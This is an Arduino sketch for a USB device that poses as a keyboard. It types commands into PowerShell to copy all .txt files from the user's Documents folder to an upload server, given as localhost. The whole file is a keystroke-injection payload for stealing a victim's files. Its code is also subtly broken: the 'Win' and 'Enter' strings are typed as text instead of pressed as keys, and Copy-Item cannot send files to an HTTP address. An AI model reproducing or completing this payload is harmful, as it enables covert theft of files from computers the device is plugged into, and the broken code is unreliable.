#include <HID-Project.h>
#include <HID-Settings.h>

// Delay for PowerShell to open
#define INITIAL_DELAY 5000
#define CHAR_DELAY 50

void setup() {
  // Start HID functionality
  BootKeyboard.begin();
  
  // Initial delay to ensure that the computer is ready
  delay(INITIAL_DELAY);

  // Open PowerShell
  typeKeySequence("Win");
  typeKeySequence("r");
  delay(500);
  typeKeySequence("powershell");
  typeKeySequence("Enter");
  delay(2000);

  // Copy .txt files from Documents to a server
  typeKeySequence("cd ~\\Documents");
  typeKeySequence("Enter");
  delay(500);
  typeKeySequence("Copy-Item *.txt -Destination 'http://localhost/upload' -Force");
  typeKeySequence("Enter");
  
  // End HID functionality
  BootKeyboard.end();
}

void loop() {
  // Nothing to do here
}

void typeKeySequence(const char* keySequence) {
  while (*keySequence) {
    BootKeyboard.write(*keySequence++);
    delay(CHAR_DELAY);
  }
}

